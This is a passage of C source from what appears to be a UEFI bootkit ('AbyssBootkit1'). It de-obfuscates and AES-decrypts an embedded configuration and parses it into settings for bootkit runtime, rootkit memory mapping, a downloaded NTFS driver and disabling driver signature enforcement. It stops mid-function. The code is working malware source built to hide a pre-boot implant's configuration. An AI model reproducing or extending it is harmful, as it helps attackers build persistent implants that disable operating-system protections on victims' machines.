// --------------------------------------------------------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------------------------------------------------------



/**
	@file

	Functions Configuration
**/



// START -> LIBRARIES -------------------------------------------------------------------------------------------------------------------------
// START -> LIBRARIES -------------------------------------------------------------------------------------------------------------------------



// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Uefi.h
// Root include file for Mde Package UEFI, UEFI_APPLICATION type modules. This is the include file for any module of type UEFI and UEFI_APPLICATION. Uefi modules only use types defined via this include file and can be ported easily to any environment.
#include <Uefi.h>

// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Library/UefiBootServicesTableLib.h
// Provides a service to retrieve a pointer to the EFI Boot Services Table. Only available to DXE and UEFI module types.
#include <Library/UefiBootServicesTableLib.h>

// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Library/UefiLib.h
// Provides library functions for common UEFI operations. Only available to DXE and UEFI module types. The UEFI Library provides functions and macros that simplify the development of UEFI Drivers and UEFI Applications. These functions and macros help manage EFI events, build simple locks utilizing EFI Task Priority Levels (TPLs), install EFI Driver Model related protocols, manage Unicode string tables for UEFI Drivers, and print messages on the console output and standard error devices.
#include <Library/UefiLib.h>

// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Library/BaseMemoryLib.h
// Provides copy memory, fill memory, zero memory, and GUID functions. The Base Memory Library provides optimized implementations for common memory-based operations. These functions should be used in place of coding your own loops to do equivalent common functions. This allows optimized library implementations to help increase performance.
#include <Library/BaseMemoryLib.h>

// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Library/MemoryAllocationLib.h
// Provides services to allocate and free memory buffers of various memory types and alignments. The Memory Allocation Library abstracts various common memory allocation operations. This library allows code to be written in a phase-independent manner because the allocation of memory in PEI, DXE, and SMM (for example) is done via a different mechanism. Using a common library interface makes it much easier to port algorithms from phase to phase.
#include <Library/MemoryAllocationLib.h>

// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Library/PrintLib.h
// Provides services to print a formatted string to a buffer. All combinations of Unicode and ASCII strings are supported.
#include <Library/PrintLib.h>

// https://github.com/tianocore/edk2/blob/master/CryptoPkg/Include/Library/BaseCryptLib.h
// Defines base cryptographic library APIs. The Base Cryptographic Library provides implementations of basic cryptography primitives (Hash Serials, HMAC, RSA, Diffie-Hellman, etc) for UEFI security functionality enabling.
#include <Library/BaseCryptLib.h>



// START -> LOCAL -----------------------------------------------------------------------------------------------------------------------------
// START -> LOCAL -----------------------------------------------------------------------------------------------------------------------------



#include <Modules/Module0_PreBoot0_Configuration/Functions/Utils/Utils00Debug.h>
#include <Modules/Module0_PreBoot0_Configuration/Functions/Utils/Utils02Deobfuscate.h>
#include <Modules/Module0_PreBoot0_Configuration/Functions/Utils/Utils03Decrypt.h>
#include <Modules/Module0_PreBoot0_Configuration/Functions/Utils/Utils04Json.h>



// START -> PAYLOADS --------------------------------------------------------------------------------------------------------------------------
// START -> PAYLOADS --------------------------------------------------------------------------------------------------------------------------



#include <Modules/Module0_PreBoot0_Configuration/Payloads/Payloads00DefaultEncryptedConfiguration.h>



// START -> GLOBAL VARIABLES ------------------------------------------------------------------------------------------------------------------
// START -> GLOBAL VARIABLES ------------------------------------------------------------------------------------------------------------------



CHAR16 *Global_PreBootConfiguration_FunctionsConfiguration_Screen = NULL;
CHAR16 *Global_PreBootConfiguration_FunctionsConfiguration_Banner = NULL;
CHAR16 *Global_PreBootConfiguration_FunctionsConfiguration_BannerImageAbyssSquid = NULL;
CHAR16 *Global_PreBootConfiguration_FunctionsConfiguration_BannerImageSquid = NULL;
CHAR16 *Global_PreBootConfiguration_FunctionsConfiguration_BannerAscii = NULL;
CHAR16 *Global_PreBootConfiguration_FunctionsConfiguration_UEFIReadWriteNTFSDriver = NULL;
CHAR16 *Global_PreBootConfiguration_FunctionsConfiguration_UEFIReadWriteNTFSDriverDownload = NULL;
CHAR16 *Global_PreBootConfiguration_FunctionsConfiguration_UEFIReadWriteNTFSDriverURL = NULL;
CHAR16 *Global_PreBootConfiguration_FunctionsConfiguration_UEFIReadWriteNTFSDriverPath = NULL;
CHAR16 *Global_PreBootConfiguration_FunctionsConfiguration_AdditionalComponent = NULL;
CHAR16 *Global_PreBootConfiguration_FunctionsConfiguration_AdditionalComponentPath = NULL;
CHAR16 *Global_PreBootConfiguration_FunctionsConfiguration_BootkitRuntime = NULL;
CHAR16 *Global_PreBootConfiguration_FunctionsConfiguration_BootkitRuntimePath = NULL;
CHAR16 *Global_PreBootConfiguration_FunctionsConfiguration_BootkitBoot = NULL;
CHAR16 *Global_PreBootConfiguration_FunctionsConfiguration_BootkitBootMapRootkitToMemory = NULL;
CHAR16 *Global_PreBootConfiguration_FunctionsConfiguration_BootkitBootMapRootkitToMemoryModule = NULL;
CHAR16 *Global_PreBootConfiguration_FunctionsConfiguration_DisableProtections = NULL;
CHAR16 *Global_PreBootConfiguration_FunctionsConfiguration_DisableProtectionsDSE = NULL;



// START -> FUNCTIONS -------------------------------------------------------------------------------------------------------------------------
// START -> FUNCTIONS -------------------------------------------------------------------------------------------------------------------------



/**
	@brief          Reads and decrypts the encrypted configuration data.
	@details        This function reads the encrypted configuration data, deobfuscates it using a combination of XOR and Caesar cipher techniques, decodes the result from Base64, and then decrypts it using AES in CBC mode. The decrypted configuration data and its size are returned to the caller.


	@param[out]     DecryptedConfiguration              Pointer to the buffer that will receive the decrypted configuration data.
	@param[out]     DecryptedConfigurationSize          Pointer to the variable that will receive the size of the decrypted configuration data buffer.


	@retval         EFI_SUCCESS                         The configuration data was successfully read and decrypted.
	@retval         EFI_OUT_OF_RESOURCES                There was not enough memory to allocate the necessary buffers.
	@retval         EFI_ABORTED                         The decryption process failed.
	@retval         EFI_INVALID_PARAMETER               One or more input parameters are NULL or invalid.
**/
EFI_STATUS
PreBootConfiguration_FunctionsConfiguration_ReadEncryptedConfiguration(
	OUT             UINT8                               **DecryptedConfiguration,
	OUT             UINTN                               *DecryptedConfigurationSize
)
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Hello
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootConfiguration [Functions/Configuration.c] (ReadEncryptedConfiguration) - Hello\r\n");


	// ---------------------------------------------------------------------------------------------------------------------
	// Variables
	EFI_STATUS Status;
	UINT8 *deobfuscated_key;
	UINT8 *deobfuscated_configuration;
	UINTN deobfuscated_configuration_size;
	UINT8 *base64_decoded_config = NULL;
	UINTN base64_decoded_size = 0;
	UINT8 iv[16];


	// ---------------------------------------------------------------------------------------------------------------------
	// Deobfuscate the key
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootConfiguration [Functions/Configuration.c] (ReadEncryptedConfiguration) - Deobfuscate the key\r\n");

	// Apply deobfuscation
	Status = PreBootConfiguration_UtilsDeobfuscate_DeobfuscateKeyXorPermutation(Global_PreBootConfiguration_PayloadsEncryptedConfiguration_KeyObfuscatedKey, Global_PreBootConfiguration_PayloadsEncryptedConfiguration_KeyXorKey, Global_PreBootConfiguration_PayloadsEncryptedConfiguration_KeyPermutation, Global_PreBootConfiguration_PayloadsEncryptedConfiguration_KeyKeySize, &deobfuscated_key);

	// Failed
	if (EFI_ERROR(Status))
	{
		PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR, L"AbyssBootkit1 -> PreBootConfiguration [Functions/Configuration.c] (ReadEncryptedConfiguration) - PreBootConfiguration_UtilsDeobfuscate_DeobfuscateKeyXorPermutation failed: %r (%llx).\r\n", Status, Status);
		return Status;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Print the deobfuscated key for debugging purposes
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootConfiguration [Functions/Configuration.c] (ReadEncryptedConfiguration) - Print the deobfuscated key for debugging purposes\r\n");

	// Deobfuscated key
	for (UINTN i = 0; i < Global_PreBootConfiguration_PayloadsEncryptedConfiguration_KeyKeySize; i++)
	{
		// Print(L"%02x ", deobfuscated_key[i]);
		PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"%02x ", deobfuscated_key[i]);
	}
	// Print(L"\r\n");
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"\r\n");


	// ---------------------------------------------------------------------------------------------------------------------
	// Deobfuscate the configuration
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootConfiguration [Functions/Configuration.c] (ReadEncryptedConfiguration) - Deobfuscate the configuration\r\n");

	// Apply deobfuscation
	Status = PreBootConfiguration_UtilsDeobfuscate_DeobfuscateStringXorCaesar(Global_PreBootConfiguration_PayloadsEncryptedConfiguration_ConfigurationEncryptedConfiguration, Global_PreBootConfiguration_PayloadsEncryptedConfiguration_ConfigurationXorKey, Global_PreBootConfiguration_PayloadsEncryptedConfiguration_ConfigurationCaesarShift, &deobfuscated_configuration, &deobfuscated_configuration_size);

	// Failed
	if (EFI_ERROR(Status))
	{
		PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR, L"AbyssBootkit1 -> PreBootConfiguration [Functions/Configuration.c] (ReadEncryptedConfiguration) - PreBootConfiguration_UtilsDeobfuscate_DeobfuscateStringXorCaesar failed: %r (%llx).\r\n", Status, Status);
		return Status;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Print the deobfuscated configuration before final Base64 decode for debugging purposes
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootConfiguration [Functions/Configuration.c] (ReadEncryptedConfiguration) - Print the deobfuscated configuration before final Base64 decode for debugging purposes\r\n");

	// Deobfuscated configuration before final Base64 decode
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"%a\r\n", deobfuscated_configuration);


	// ---------------------------------------------------------------------------------------------------------------------
	// Base64 decode the deobfuscated configuration


	// Step 1: Determine the size of the decoded data
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootConfiguration [Functions/Configuration.c] (ReadEncryptedConfiguration) - Step 1: Determine the size of the decoded data\r\n");

	// Decode Base64 ASCII encoded data to 8-bit binary representation, based on RFC4648.
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootConfiguration [Functions/Configuration.c] (ReadEncryptedConfiguration) - Decode Base64 ASCII encoded data to 8-bit binary representation\r\n");

	// https://github.com/tianocore/edk2/blob/master/MdePkg/Library/BaseLib/String.c#L1363
	// https://github.com/tianocore/edk2/blob/master/MdePkg/Library/BaseLib/String.c#L633
	Status = Base64Decode((CHAR8 *)deobfuscated_configuration, deobfuscated_configuration_size, NULL, &base64_decoded_size);

	// Failed
	if (Status != RETURN_BUFFER_TOO_SMALL && EFI_ERROR(Status))
	{
		PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR, L"AbyssBootkit1 -> PreBootConfiguration [Functions/Configuration.c] (ReadEncryptedConfiguration) - Base64Decode failed: %r (%llx).\r\n", Status, Status);
		return Status;
	}


	// Step 2: Allocate memory for the decoded data
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootConfiguration [Functions/Configuration.c] (ReadEncryptedConfiguration) - Step 2: Allocate memory for the decoded data\r\n");

	// Allocates pool memory.
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootConfiguration [Functions/Configuration.c] (ReadEncryptedConfiguration) - Allocates pool memory\r\n");

	// https://uefi.org/specs/UEFI/2.11/07_Services_Boot_Services.html#efi-boot-services-allocatepool
	// https://github.com/tianocore/edk2/blob/master/MdePkg/Library/PeiMemoryAllocationLib/MemoryAllocationLib.c#L400
	base64_decoded_config = AllocatePool(base64_decoded_size);

	// Failed
	if (base64_decoded_config == NULL)
	{
		PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR, L"AbyssBootkit1 -> PreBootConfiguration [Functions/Configuration.c] (ReadEncryptedConfiguration) - AllocatePool failed.\r\n");
		return EFI_OUT_OF_RESOURCES;
	}


	// Step 3: Perform the actual Base64 decoding
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootConfiguration [Functions/Configuration.c] (ReadEncryptedConfiguration) - Step 3: Perform the actual Base64 decoding\r\n");

	// Decode Base64 ASCII encoded data to 8-bit binary representation, based on RFC4648.
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootConfiguration [Functions/Configuration.c] (ReadEncryptedConfiguration) - Decode Base64 ASCII encoded data to 8-bit binary representation\r\n");

	// https://github.com/tianocore/edk2/blob/master/MdePkg/Library/BaseLib/String.c#L1363
	// https://github.com/tianocore/edk2/blob/master/MdePkg/Library/BaseLib/String.c#L633
	Status = Base64Decode((CHAR8 *)deobfuscated_configuration, deobfuscated_configuration_size, base64_decoded_config, &base64_decoded_size);

	// Failed
	if (EFI_ERROR(Status))
	{
		// Returns pool memory to the system.
		// https://uefi.org/specs/UEFI/2.11/07_Services_Boot_Services.html#efi-boot-services-freepool
		// https://github.com/tianocore/edk2/blob/master/MdePkg/Library/PeiMemoryAllocationLib/MemoryAllocationLib.c#L841
		FreePool(base64_decoded_config);

		PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR, L"AbyssBootkit1 -> PreBootConfiguration [Functions/Configuration.c] (ReadEncryptedConfiguration) - Base64Decode failed: %r (%llx).\r\n", Status, Status);
		return Status;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Extract the IV from the decoded configuration
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootConfiguration [Functions/Configuration.c] (ReadEncryptedConfiguration) - Extract the IV from the decoded configuration\r\n");

	// Copies a source buffer to a destination buffer, and returns the destination buffer.
	// https://uefi.org/specs/UEFI/2.11/07_Services_Boot_Services.html#efi-boot-services-copymem
	// https://github.com/tianocore/edk2/blob/master/MdePkg/Library/BaseMemoryLib/CopyMemWrapper.c#L41
	CopyMem(iv, base64_decoded_config, 16);


	// ---------------------------------------------------------------------------------------------------------------------
	// Print the IV for debugging purposes
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootConfiguration [Functions/Configuration.c] (ReadEncryptedConfiguration) - Print the IV for debugging purposes\r\n");

	// IV
	for (UINTN i = 0; i < 16; i++)
	{
		// Print(L"%02x ", iv[i]);
		PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"%02x ", iv[i]);
	}
	// Print(L"\r\n");
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"\r\n");


	// ---------------------------------------------------------------------------------------------------------------------
	// Decrypt the configuration
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootConfiguration [Functions/Configuration.c] (ReadEncryptedConfiguration) - Decrypt the configuration\r\n");

	// Apply decryption
	Status = PreBootConfiguration_UtilsDecrypt_DecryptConfiguration(base64_decoded_config + 16, base64_decoded_size - 16, deobfuscated_key, iv, DecryptedConfiguration, DecryptedConfigurationSize);

	// Failed
	if (EFI_ERROR(Status))
	{
		// Returns pool memory to the system.
		// https://uefi.org/specs/UEFI/2.11/07_Services_Boot_Services.html#efi-boot-services-freepool
		// https://github.com/tianocore/edk2/blob/master/MdePkg/Library/PeiMemoryAllocationLib/MemoryAllocationLib.c#L841
		FreePool(base64_decoded_config);

		PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR, L"AbyssBootkit1 -> PreBootConfiguration [Functions/Configuration.c] (ReadEncryptedConfiguration) - PreBootConfiguration_UtilsDecrypt_DecryptConfiguration failed: %r (%llx).\r\n", Status, Status);
		return Status;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Print the decrypted configuration for debugging purposes
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootConfiguration [Functions/Configuration.c] (ReadEncryptedConfiguration) - Print the decrypted configuration for debugging purposes\r\n");

	// Configuration
	for (UINTN i = 0; i < *DecryptedConfigurationSize; i++)
	{
		// Print(L"%c", (*DecryptedConfiguration)[i]);
		PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"%c", (*DecryptedConfiguration)[i]);
	}
	// Print(L"\r\n");
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"\r\n");


	// ---------------------------------------------------------------------------------------------------------------------
	// Bye
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootConfiguration [Functions/Configuration.c] (ReadEncryptedConfiguration) - Bye\r\n");

	// Returns pool memory to the system.
	// https://uefi.org/specs/UEFI/2.11/07_Services_Boot_Services.html#efi-boot-services-freepool
	// https://github.com/tianocore/edk2/blob/master/MdePkg/Library/PeiMemoryAllocationLib/MemoryAllocationLib.c#L841
	FreePool(base64_decoded_config);


	// ---------------------------------------------------------------------------------------------------------------------
	// Return
	return EFI_SUCCESS;
}



/**
	@brief          Retrieves a value from JSON, allocates memory, and sets a global configuration variable.


	@param[in]      JsonString                          A pointer to a null-terminated JSON string containing the configuration data.
	@param[in]      JsonKey                             The JSON key to look up.
	@param[out]     *GlobalVariable                     Pointer to the global variable to set.
	@param[out]     VariableName                        Name of the global variable for logging.


	@retval         EFI_SUCCESS                         The value was successfully retrieved and set.
	@retval         EFI_OUT_OF_RESOURCES                Memory allocation failed while processing the value.
	@retval         EFI_INVALID_PARAMETER               The provided JSON string was invalid or could not be parsed.
**/
EFI_STATUS
PreBootConfiguration_FunctionsConfiguration_SetGlobalVariablesFromJson(
	IN              CHAR8                               *JsonString,
	IN              CONST CHAR8                         *JsonKey,
	OUT             CHAR16                              **GlobalVariable,
	IN              CONST CHAR16                        *VariableName
)
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Hello
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootConfiguration [Functions/Configuration.c] (SetGlobalVariablesFromJson) - Hello\r\n");


	// ---------------------------------------------------------------------------------------------------------------------
	// Variables
	EFI_STATUS Status;
	CHAR8 **Value = NULL;
	UINTN ValueCount;


	// ---------------------------------------------------------------------------------------------------------------------
	// Retrieve and set the configuration
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootConfiguration [Functions/Configuration.c] (SetGlobalVariablesFromJson) - Retrieve and set the configuration\r\n");

	// Attempt to parse JSON configuration string and retrieve the value(s) associated with the given key
	Status = PreBootConfiguration_UtilsJson_ParseJson(JsonString, JsonKey, &Value, &ValueCount);


	// ---------------------------------------------------------------------------------------------------------------------
	// If parsing succeeds and at least one value is returned
	if (!EFI_ERROR(Status) && ValueCount > 0)
	{
		// -----------------------------------------------------------------------------------------------------------------
		// Compute total length needed for CHAR16 string (including commas and null terminator)
		UINTN TotalChar8Length = 0;
		for (UINTN i = 0; i < ValueCount; ++i)
		{
			// Returns the length of a Null-terminated ASCII string.
			// https://github.com/tianocore/edk2/blob/master/MdePkg/Library/BaseLib/String.c#L633
			TotalChar8Length += AsciiStrLen(Value[i]);
			if (i < ValueCount - 1) TotalChar8Length += 1;
		}
		UINTN TotalChar16Size = (TotalChar8Length + 1) * sizeof(CHAR16);


		// -----------------------------------------------------------------------------------------------------------------
		// Allocate final buffer directly

		// Allocates and zeros a buffer of type EfiBootServicesData.
		// https://github.com/tianocore/edk2/blob/master/MdePkg/Library/PeiMemoryAllocationLib/MemoryAllocationLib.c#L502
		*GlobalVariable = AllocateZeroPool(TotalChar16Size);
		if (*GlobalVariable == NULL)
		{
			FreePool(Value);
			PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR, L"AbyssBootkit1 -> PreBootConfiguration [Functions/Configuration.c] (SetGlobalVariablesFromJson) - AllocateZeroPool [%s] failed.\r\n", VariableName);
			return EFI_OUT_OF_RESOURCES;
		}


		// -----------------------------------------------------------------------------------------------------------------
		// Fill the buffer with comma-separated Unicode string
		CHAR16 *Dst = *GlobalVariable;
		for (UINTN i = 0; i < ValueCount; ++i)
		{
			// Convert one Null-terminated ASCII string to a Null-terminated Unicode string.
			// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Library/BaseLib.h#L2593
			AsciiStrToUnicodeStrS(Value[i], Dst, TotalChar8Length + 1);
			Dst += StrLen(Dst);
			// Insert comma between values
			if (i < ValueCount - 1) *Dst++ = L',';
		}
	}
	// Failed
	else
	{
		PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR, L"AbyssBootkit1 -> PreBootConfiguration [Functions/Configuration.c] (SetGlobalVariablesFromJson) - PreBootConfiguration_UtilsJson_ParseJson [%s] failed.\r\n", VariableName);
		return EFI_INVALID_PARAMETER;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Bye
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootConfiguration [Functions/Configuration.c] (SetGlobalVariablesFromJson) - Bye\r\n");

	// Returns pool memory to the system.
	// https://uefi.org/specs/UEFI/2.11/07_Services_Boot_Services.html#efi-boot-services-freepool
	// https://github.com/tianocore/edk2/blob/master/MdePkg/Library/PeiMemoryAllocationLib/MemoryAllocationLib.c#L841
	FreePool(Value);


	// ---------------------------------------------------------------------------------------------------------------------
	// Return
	return EFI_SUCCESS;
}



/**
	@brief          Initializes configuration fields based on the provided JSON string.
	@details        It updates the global variables corresponding to different configuration parameters with the values obtained from the JSON.

	@param[in]      JsonString                  A pointer to a null-terminated JSON string containing the configuration data.

	@retval         EFI_SUCCESS                 The function completed successfully and all configuration fields have been initialized.
	@retval         EFI_OUT_OF_RESOURCES        Memory allocation failed while processing the configuration.
	@retval         EFI_INVALID_PARAMETER       The provided JSON string was invalid or could not be parsed.
**/
EFI_STATUS
PreBootConfiguration_FunctionsConfiguration_InitializeConfigurationFields(
	IN              CHAR8                       *JsonString
)
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Hello
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootConfiguration [Functions/Configuration.c] (InitializeConfigurationFields) - Hello\r\n");


	// ---------------------------------------------------------------------------------------------------------------------
	// Variables
	EFI_STATUS Status;


	// ---------------------------------------------------------------------------------------------------------------------
	// Retrieve and set the Screen configuration
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootConfiguration [Functions/Configuration.c] (InitializeConfigurationFields) - Retrieve and set the Screen configuration\r\n");

	Status = PreBootConfiguration_FunctionsConfiguration_SetGlobalVariablesFromJson(JsonString, Global_PreBootConfiguration_PayloadsEncryptedConfiguration_Screen, &Global_PreBootConfiguration_FunctionsConfiguration_Screen, L"Screen");

	// Failed
	if (EFI_ERROR(Status))
	{
		PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR, L"AbyssBootkit1 -> PreBootConfiguration [Functions/Configuration.c] (InitializeConfigurationFields) - SetGlobalConfigurationFromJson [Global_PreBootConfiguration_FunctionsConfiguration_Screen] failed: %r (%llx).\r\n", Status, Status);
		return Status;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Retrieve and set the Banner configuration
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootConfiguration [Functions/Configuration.c] (InitializeConfigurationFields) - Retrieve and set the Banner configuration\r\n");

	Status = PreBootConfiguration_FunctionsConfiguration_SetGlobalVariablesFromJson(JsonString, Global_PreBootConfiguration_PayloadsEncryptedConfiguration_Banner, &Global_PreBootConfiguration_FunctionsConfiguration_Banner, L"Banner");

	// Failed
	if (EFI_ERROR(Status))
	{
		PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR, L"AbyssBootkit1 -> PreBootConfiguration [Functions/Configuration.c] (InitializeConfigurationFields) - SetGlobalConfigurationFromJson [Global_PreBootConfiguration_FunctionsConfiguration_Banner] failed: %r (%llx).\r\n", Status, Status);
		return Status;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Retrieve and set the BannerImageAbismoSquid configuration
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootConfiguration [Functions/Configuration.c] (InitializeConfigurationFields) - Retrieve and set the BannerImageAbismoSquid configuration\r\n");

	Status = PreBootConfiguration_FunctionsConfiguration_SetGlobalVariablesFromJson(JsonString, Global_PreBootConfiguration_PayloadsEncryptedConfiguration_BannerImageAbyssSquid, &Global_PreBootConfiguration_FunctionsConfiguration_BannerImageAbyssSquid, L"BannerImageAbismoSquid");

	// Failed
	if (EFI_ERROR(Status))
	{
		PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR, L"AbyssBootkit1 -> PreBootConfiguration [Functions/Configuration.c] (InitializeConfigurationFields) - SetGlobalConfigurationFromJson [Global_PreBootConfiguration_FunctionsConfiguration_BannerImageAbyssSquid] failed: %r (%llx).\r\n", Status, Status);
		return Status;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Retrieve and set the BannerImageSquid configuration
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootConfiguration [Functions/Configuration.c] (InitializeConfigurationFields) - Retrieve and set the BannerImageSquid configuration\r\n");

	Status = PreBootConfiguration_FunctionsConfiguration_SetGlobalVariablesFromJson(JsonString, Global_PreBootConfiguration_PayloadsEncryptedConfiguration_BannerImageSquid, &Global_PreBootConfiguration_FunctionsConfiguration_BannerImageSquid, L"BannerImageSquid");

	// Failed
	if (EFI_ERROR(Status))
	{
